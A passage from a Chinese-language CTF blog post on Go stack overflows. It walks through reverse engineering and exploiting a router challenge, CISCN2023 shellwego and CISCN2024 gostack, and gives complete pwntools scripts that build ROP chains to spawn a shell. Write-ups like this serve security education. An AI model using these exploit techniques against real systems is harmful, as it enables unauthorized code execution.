</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u8
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p32
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p16
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p8
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>ctypes</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>Crypto.Cipher</span> <span style=color:#a2f;font-weight:700>import</span> ARC4
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>p <span style=color:#666>=</span> process(<span style=color:#b44>&#34;/home/zp9080/PWN/route&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=gdb.debug(&#34;/home/zp9080/PWN/pwn&#34;,&#39;b *0x8049324&#39;)</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=remote(&#39;0192d5d3be0f782ea43281dc0cf29672.3iz5.dg04.ciihw.cn&#39;,46453)</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;])</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># elf = ELF(&#34;/home/zp9080/PWN/pwn&#34;)</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># libc=elf.libc </span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#b *$rebase(0x14F5)</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dbg</span>():
</span></span><span style=display:flex><span>    gdb<span style=color:#666>.</span>attach(p,<span style=color:#b44>&#39;b *0x4D858C&#39;</span>)
</span></span><span style=display:flex><span>    pause()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>set_dns</span>(dns,ip):
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>b</span><span style=color:#b44>&#34;Router&#34;</span>,<span style=color:#b44>b</span><span style=color:#b44>&#34;set dns &#34;</span> <span style=color:#666>+</span> dns <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#34; &#34;</span> <span style=color:#666>+</span> ip)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>set_route</span>(route):
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;Router&#34;</span>,<span style=color:#b44>b</span><span style=color:#b44>&#34;set route &#34;</span> <span style=color:#666>+</span> route)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>exec</span>(cmd):
</span></span><span style=display:flex><span>    p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;Router&#34;</span>,<span style=color:#b44>b</span><span style=color:#b44>&#34;exec &#34;</span> <span style=color:#666>+</span> cmd)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(<span style=color:#b44>b</span><span style=color:#b44>&#39;cert 4ceb539da109caf8eea7&#39;</span>)
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(<span style=color:#b44>b</span><span style=color:#b44>&#39;configure&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pop_rax_rbp <span style=color:#666>=</span> <span style=color:#666>0x0000000000405368</span>
</span></span><span style=display:flex><span>pop_rbx <span style=color:#666>=</span> <span style=color:#666>0x0000000000461dc1</span>
</span></span><span style=display:flex><span>pop_rcx <span style=color:#666>=</span> <span style=color:#666>0x0000000000433347</span>
</span></span><span style=display:flex><span>bss <span style=color:#666>=</span> <span style=color:#666>0x006102B0</span>
</span></span><span style=display:flex><span>pop_rbp <span style=color:#666>=</span> <span style=color:#666>0x0000000000401030</span><span style=color:#080;font-style:italic>#: pop rbp ; ret</span>
</span></span><span style=display:flex><span>sys_read <span style=color:#666>=</span> <span style=color:#666>0x0048DB60</span> 
</span></span><span style=display:flex><span>leave_ret <span style=color:#666>=</span> <span style=color:#666>0x00000000004a721a</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#b44>b</span><span style=color:#b44>&#34;.&#34;</span><span style=color:#666>*</span><span style=color:#666>0x207</span><span style=color:#666>+</span>p64(pop_rbp) <span style=color:#666>+</span> p64(bss)<span style=color:#666>+</span> p64(pop_rcx) <span style=color:#666>+</span> p64(<span style=color:#666>0x200</span>) <span style=color:#666>+</span> p64(pop_rbx) <span style=color:#666>+</span> p64(<span style=color:#666>0x006102B0</span>) <span style=color:#666>+</span> p64(sys_read) <span style=color:#666>+</span> p64(leave_ret)[:<span style=color:#666>5</span>]
</span></span><span style=display:flex><span>set_dns(payload,<span style=color:#b44>b</span><span style=color:#b44>&#39;1.1.1.1&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># dbg()</span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;Router&#34;</span>,<span style=color:#b44>b</span><span style=color:#b44>&#34;exec ping host &#34;</span> <span style=color:#666>+</span>payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>syscall <span style=color:#666>=</span> <span style=color:#666>0x004735A9</span> <span style=color:#080;font-style:italic>#mov  rdi, rbx;syscall</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(pop_rax_rbp) <span style=color:#666>+</span> p64(<span style=color:#666>0x3b</span>) <span style=color:#666>+</span> p64(<span style=color:#666>0</span>) <span style=color:#666>+</span> p64(pop_rbx) <span style=color:#666>+</span> p64(bss<span style=color:#666>+</span><span style=color:#666>0x100</span>) <span style=color:#666>+</span> p64(syscall)
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(payload<span style=color:#666>.</span>ljust(<span style=color:#666>0x100</span>,<span style=color:#b44>b</span><span style=color:#b44>&#34;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#34;</span>)<span style=color:#666>+</span><span style=color:#b44>b</span><span style=color:#b44>&#34;/bin/sh</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h1 id=ciscn2023-shellwego>CISCN2023 shellwego
<a class=header-anchor href=#ciscn2023-shellwego></a></h1><h2 id=第一阶段-1>第一阶段
<a class=header-anchor href=#%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5-1></a></h2><p>这里先捋一下各个函数之间的调用关系</p><p>main_main打印ciscnshell$或者nightingale#，然后调用main_unk_func0b05，<strong>main_unk_func0b05是主要的函数，cert过后可以执行一些限制的命令。</strong></p><p><strong>如果输入cert会进入main_unk_func0b01函数，输入echo就会进入main_unk_func0b04，在main_unk_func0b04再调用main_unk_func0b03</strong></p><p>所以第一步我们要先过了cert，可以看func1中看到就是一个RC4加密然后进行base64，与JLIX8pbSvYZu/WaG字符串进行比较看看是否相同，RC4密钥也给了，所以可以想到就是直接cert S33UAga1n@#! 但是会报错Missing parameter
<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/91.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/92.png alt></p><p>继续看func5中的cert流程，很明显地可以看到有个mov rdx, &mldr;;cmp [rcx], rdx这种指令，<strong>自然可以想到这就是字符串比较，而在逆向中这些字符串可以说是关键节点，一定要留意</strong>。<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/93.png alt> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/94.png alt></p><p>所以变成cert nAcDsMicN S33UAga1n@#!就过了cert</p><h2 id=第二阶段-1>第二阶段
<a class=header-anchor href=#%e7%ac%ac%e4%ba%8c%e9%98%b6%e6%ae%b5-1></a></h2><p>过了cert我们就继续看有哪些指令可以用，进而发现漏洞。<strong>这里建议直接看汇编流程图，这个题反汇编会把很多信息抹掉，具体为什么我也不清楚</strong></p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-text data-lang=text><span style=display:flex><span>发现ls后就会执行os_exec_Command os_exec__ptr_Cmd_Run，而且没有命令绕过比如用&amp;,|这些。
</span></span><span style=display:flex><span>cat只让cat flag得到假的flag，想要cat其他文件都会Permission denial
</span></span><span style=display:flex><span>whoami,exit也没漏洞
</span></span><span style=display:flex><span>cert函数对应的func1肯定要不用看了
</span></span></code></pre></div><p>这里记录一下我的一些思考，就是<strong>这种题目的漏洞，想要直接命令绕过一般都不太可能，因为这些指令都是通过字符串比较，而且题目不会简单到直接给一个命令执行的漏洞</strong></p><p><strong>其次，想要通过输入直接溢出也不可能，你在go中的外界输入，比如cat b&rsquo;a&rsquo;*0x200，这个0x200个a是不会直接存在函数调用的栈上的，而是存在类似mmap出来的很大的一块区域上的。所以如果想溢出，一定是在这把这个mmap区域的字符串复制到栈上的过程中，因为对len检查的不严格，所以导致栈溢出，进而getshell</strong></p><p>最后我们把目光锁定在echo这个命令上，它对应的函数也很多，对应func4,func3</p><p><strong>在func4函数中看到这样一个复制，v41变量在栈上，距离rbp为228h，而i的限制是0x400，所以很明显可以栈溢出，同时这里如果遇到的是&rsquo;+&rsquo;，只会直接跳过赋值，但是i仍然会增加</strong> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/95.png alt></p><p>所以我做了以下尝试pay=b&rsquo;echo &lsquo;+b&rsquo;a&rsquo;*0x300，但是<strong>发现甚至没有打印unk_func0b04:这个字符串</strong>，也就说明没有进入func3 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/96.png alt>
翻到func4上面有如上内容，<strong>看到了一个0x200的限制，所以可以先猜测这个地方是对输入的字符有0x200的长度限制，同时注意到func5中会调用strings_genSplit，根据&rsquo; &lsquo;对字符串进行分析，其返回值我上面已经提到了。</strong> <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/97.png alt></p><p><strong>所以可以很顺利的推测，这个0x200的限制应该是对分割后的每一个字符串进行限制，所以我想到了如下payload，pay=b&rsquo;echo &lsquo;+b&rsquo;a&rsquo;*0x150+b&rsquo; &lsquo;+b&rsquo;a&rsquo;*0x150，发现确实打崩了程序!!!</strong></p><h2 id=第三阶段-1>第三阶段
<a class=header-anchor href=#%e7%ac%ac%e4%b8%89%e9%98%b6%e6%ae%b5-1></a></h2><p>第二阶段我们已经找到了利用点并且让程序dump，这种栈溢出的难点就在于找到溢出点，找到了后对于一个Pwn手来说打这个都不是什么大问题</p><p>实际操作的时候发现&rsquo;unk_func0b04&rsquo;字符出竟然也在栈上，那么调整一下padding就好了。 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/98.png alt></p><ul><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>p <span style=color:#666>=</span> process(<span style=color:#b44>&#34;/home/zp9080/PWN/shellwego&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=gdb.debug(&#34;/home/zp9080/PWN/shellwego&#34;,&#39;b *0x401265&#39;)</span>
</span></span><span style=display:flex><span>elf <span style=color:#666>=</span> ELF(<span style=color:#b44>&#34;/home/zp9080/PWN/shellwego&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dbg</span>():
</span></span><span style=display:flex><span>    gdb<span style=color:#666>.</span>attach(p,<span style=color:#b44>&#39;b *0x4C184F&#39;</span>)
</span></span><span style=display:flex><span>    pause()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dbg()
</span></span><span style=display:flex><span>payload<span style=color:#666>=</span><span style=color:#b44>b</span><span style=color:#b44>&#39;cert nAcDsMicN S33UAga1n@#!&#39;</span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>poprdi_ret <span style=color:#666>=</span> <span style=color:#666>0x444fec</span>
</span></span><span style=display:flex><span>poprsi_ret <span style=color:#666>=</span> <span style=color:#666>0x41e818</span>
</span></span><span style=display:flex><span>poprdx_ret <span style=color:#666>=</span> <span style=color:#666>0x49e11d</span>
</span></span><span style=display:flex><span>poprax_ret <span style=color:#666>=</span> <span style=color:#666>0x40d9e6</span>
</span></span><span style=display:flex><span>syscall <span style=color:#666>=</span> <span style=color:#666>0x40328c</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#unk_func0b04: 13  0xd</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#用&#39; &#39;绕过cmp rdx,0x200</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span><span style=color:#b44>b</span><span style=color:#b44>&#39;echo &#39;</span><span style=color:#666>+</span><span style=color:#b44>b</span><span style=color:#b44>&#39;a&#39;</span><span style=color:#666>*</span><span style=color:#666>0x1f0</span> <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#39; &#39;</span> <span style=color:#666>+</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;+&#39;</span><span style=color:#666>*</span><span style=color:#666>0x33</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprdi_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprax_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprsi_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0x59FE70</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprdx_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>20</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(syscall)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprdi_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0x59FE70</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprax_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>59</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprsi_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(poprdx_ret)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(<span style=color:#666>0</span>)
</span></span><span style=display:flex><span>payload <span style=color:#666>+=</span> p64(syscall)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;nightingale#&#34;</span>,payload)
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(<span style=color:#b44>&#34;/bin/sh</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h1 id=ciscn2024-gostack>CISCN2024 gostack
<a class=header-anchor href=#ciscn2024-gostack></a></h1><p>题目流程很简单，这个main_main_func2是个后门，但是main_main_func3永远返回0，所以正常情况下永远不会执行到后门。<strong>所以如果能栈溢出，我们肯定是希望能够直接覆盖返回地址为后门就可以了</strong>
<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/99.png alt></p><p>可以看到main_main_func3中又有个for循环赋值，同时追溯v24的来源,如下，可以看到非常明显的栈溢出</p><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#0b0;font-weight:700>char</span> <span style=color:#666>*</span>v24; <span style=color:#080;font-style:italic>// rdx
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span><span style=color:#0b0;font-weight:700>char</span> v33[<span style=color:#666>72</span>]; <span style=color:#080;font-style:italic>// [rsp+48h] [rbp-1D0h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span><span style=color:#0b0;font-weight:700>char</span> <span style=color:#666>*</span>v39; <span style=color:#080;font-style:italic>// [rsp+178h] [rbp-A0h]
</span></span></span><span style=display:flex><span><span style=color:#080;font-style:italic></span>
</span></span><span style=display:flex><span>v24 <span style=color:#666>=</span> v39;
</span></span><span style=display:flex><span>v39 <span style=color:#666>=</span> v33;
</span></span></code></pre></div><p><img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/100.png alt></p><p>bufio__ptr_Scanner_Scan函数读取的字符串还是跟我上面说的一样，存到一个类似mmap出来的区域 <img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/101.png alt></p><p>所以正常思路的payload应该是这样payload = b&rsquo;a&rsquo;*0x1d0+p64(backdoor),但是会发现程序奇怪的崩掉了</p><p>追溯一下原因，<strong>发现for循环赋值后还有别的函数要执行，那么把原本栈上的数据覆盖为a肯定会影响其他函数执行，在其他函数执行的时候程序就崩掉了，执行不到后门</strong>
<img src=/imgs/img-lazy-loading.gif data-src=/imgs/photos5/102.png alt></p><p>所以我采用了如下payload，payload = b&rsquo;\x00&rsquo;*0x1d0+p64(backdoor)，这就打通了。</p><p><strong>这样做的原因主要是根据经验，一般函数传参传入个null一般都没什么事，或者用一个可写地址覆盖也行，但这里我试了可写地址不行。所以用了这个方法。还有种更暴力的方法，直接看栈上每个地方存的数据，然后一个个换源，如果是个可写地址那就覆盖为bss就行</strong></p><ul><li>exp</li></ul><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:1;-o-tab-size:1;tab-size:1><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u32
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u16
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> u8
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p64
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p32
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p16
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwnlib.util.packing</span> <span style=color:#a2f;font-weight:700>import</span> p8
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>pwn</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>ctypes</span> <span style=color:#a2f;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>from</span> <span style=color:#00f;font-weight:700>Crypto.Cipher</span> <span style=color:#a2f;font-weight:700>import</span> ARC4
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>context(os<span style=color:#666>=</span><span style=color:#b44>&#39;linux&#39;</span>, arch<span style=color:#666>=</span><span style=color:#b44>&#39;amd64&#39;</span>, log_level<span style=color:#666>=</span><span style=color:#b44>&#39;debug&#39;</span>)
</span></span><span style=display:flex><span>p <span style=color:#666>=</span> process(<span style=color:#b44>&#34;/home/zp9080/PWN/gostack&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=gdb.debug(&#34;/home/zp9080/PWN/gostack&#34;,&#39;b *0x4A0A97&#39;)</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=remote(&#39;0192d5d3be0f782ea43281dc0cf29672.3iz5.dg04.ciihw.cn&#39;,46453)</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># p=process([&#39;seccomp-tools&#39;,&#39;dump&#39;,&#39;/home/zp9080/PWN/pwn&#39;])</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># elf = ELF(&#34;/home/zp9080/PWN/gostack&#34;)</span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># libc=elf.libc </span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic>#b *$rebase(0x14F5)</span>
</span></span><span style=display:flex><span><span style=color:#a2f;font-weight:700>def</span> <span style=color:#00a000>dbg</span>():
</span></span><span style=display:flex><span>    gdb<span style=color:#666>.</span>attach(p,<span style=color:#b44>&#39;b *0x4A0A41&#39;</span>)
</span></span><span style=display:flex><span>    pause()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#080;font-style:italic># dbg()</span>
</span></span><span style=display:flex><span>backdoor<span style=color:#666>=</span><span style=color:#666>0x4A0AF6</span>
</span></span><span style=display:flex><span>payload <span style=color:#666>=</span> <span style=color:#b44>b</span><span style=color:#b44>&#39;</span><span style=color:#b62;font-weight:700>\x00</span><span style=color:#b44>&#39;</span><span style=color:#666>*</span><span style=color:#666>0x1d0</span><span style=color:#666>+</span>p64(backdoor)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendlineafter(<span style=color:#b44>&#34;Input your magic message :&#34;</span>,payload)
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>sendline(<span style=color:#b44>&#39;sh&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p<span style=color:#666>.</span>interactive()
</span></span></code></pre></div><h1 id=一些总结>一些总结
<a class=header-anchor href=#%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93></a></h1><p>通过上面三个例题，对go的栈溢出肯定有一些感受。<strong>我个人认为的难点还是找到溢出点，能够覆盖到返回地址让程序崩溃基本已经成功了，大部分时间还是在寻找漏洞点,go的反汇编一般都不是很好看，所以要有一定的猜测和经验，然后通过静态分析和动态分析相结合的方式，才能更好地找到漏洞点并进行利用</strong></p></div><footer class=post-footer><div class=post-tags><a href=/tags/go-pwn>go pwn</a></div><div class=addthis_inline_share_toolbox style=text-align:center></div><hr><div class=reward-container><div><i class="fa-solid fa-mug-hot"></i>请我喝杯咖啡吧 ヾ(^▽^*)))</div><button>
赞赏</button><div class=post-reward><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/ali-pay.png alt="f1ow - 支付宝">
<span>支付宝</span></div><div class=post-reward-item><img src=/imgs/img-lazy-loading.gif data-src=/imgs/wechat-pay.png alt="f1ow - 微信">
<span>微信</span></div></div></div><div class=post-copyright><img src=/imgs/cc/cc.svg width=75 height=75 align=right alt=共享知识><ul><li class=post-copyright-title><strong>文章标题：</strong>
go中的栈溢出</li><li class=post-copyright-author><strong>本文作者： </strong>f1ow</li><li class=post-copyright-link><strong>本文链接：</strong>
<a id=post-cr-link href=https://zp9080.github.io/post/go-pwn/go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/ title=go中的栈溢出>https://zp9080.github.io/post/go-pwn/go%E4%B8%AD%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/</a></li><li class=post-copyright-license><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <i class="fab fa-fw fa-creative-commons"></i><a target=_blank href=https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh>BY-NC-SA</a> 许可协议。转载请注明出处！</li></ul></div><div class=post-nav><div class="post-nav-next post-nav-item"><a href=/post/rust-pwn/%E4%BB%8Erust%E5%A0%86%E7%9C%8B%E5%A0%86%E5%9D%97%E4%BC%AA%E9%80%A0/ rel=next title=从rust堆看堆块伪造><i class="fa fa-chevron-left"></i> 从rust堆看堆块伪造</a></div><div class="post-nav-prev post-nav-item"><a href=/post/fuzz/afl++/ rel=prev title=AFL++>AFL++
<i class="fa fa-chevron-right"></i></a></div></div></footer></article></div></div></main><footer class=footer><div class=footer-inner><div class=copyright>&copy;
<span itemprop=copyrightYear>2024 - 2025
</span><span class=with-love><i class="fa fa-heart"></i>
</span><span class=author itemprop=copyrightHolder>f1ow</span></div><div class=powered-by>由 <a href=https://gohugo.io title=0.126.1 target=_blank>Hugo</a> & <a href=https://github.com/hugo-next/hugo-theme-next title=4.6.3 target=_blank>Hugo NexT.Gemini</a> 强力驱动</div><div class=beian><a href=https://beian.miit.gov.cn target=_blank>鄂ICP备 20240001号</a>
<img src=/imgs/gongan.png alt=鄂公网安备>
<a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=42010002002000" target=_blank>鄂公网安备 42010002002000 号</a></div><div class=vendors-list><a target=_blank href=https://vercel.com title=Vercel><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/vercel.svg alt=Vercel>
</a><a target=_blank href=https://upyun.com title=又拍云><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/upyun.png alt=又拍云>
</a><a target=_blank href=https://github.com title=Github><img src=/imgs/img-lazy-loading.gif data-src=/imgs/vendors/github.svg alt=Github>
</a><span>提供CDN/云资源支持</span></div></div></footer><script type=text/javascript src=https://zp9080.github.io/3rd/animejs/3.2.2/anime.min.js crossorigin=anonymous defer></script><script type=text/javascript src=https://zp9080.github.io/3rd/viewerjs/1.11.6/viewer.min.js crossorigin=anonymous defer></script><script class=next-config data-name=main type=application/json>{"bookmark":{"color":"#222","enable":true,"save":"manual"},"copybtn":true,"darkmode":false,"giscus":{"cfg":{"category":"Comments","categoryid":null,"emit":false,"inputposition":"top","mapping":"title","reactions":false,"repo":"username/repo-name","repoid":null,"theme":"preferred_color_scheme"},"js":"https://giscus.app/client.js"},"hostname":"https://zp9080.github.io/","i18n":{"ds_day":" 天前","ds_days":" 天 ","ds_hour":" 小时前","ds_hours":" 小时 ","ds_just":"刚刚","ds_min":" 分钟前","ds_mins":" 分钟","ds_month":" 个月前","ds_years":" 年 ","empty":"没有找到任何搜索结果：${query}","hits":"找到 ${hits} 个搜索结果","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 